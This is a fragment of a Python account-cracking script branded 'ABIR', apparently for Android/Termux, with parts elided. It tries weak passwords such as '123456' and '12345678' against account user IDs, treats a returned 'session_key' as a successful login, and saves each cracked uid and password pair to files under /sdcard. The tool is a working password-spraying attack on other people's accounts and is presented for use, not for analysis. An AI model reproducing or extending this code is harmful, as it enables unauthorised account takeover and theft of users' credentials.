...
os.system('clear')
print(' \x1b[38;5;46mABIR SERVER LOADING....')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【A B I R👑 】𓆪 \x07')
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/ABIR-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mABIR\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ABIR-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
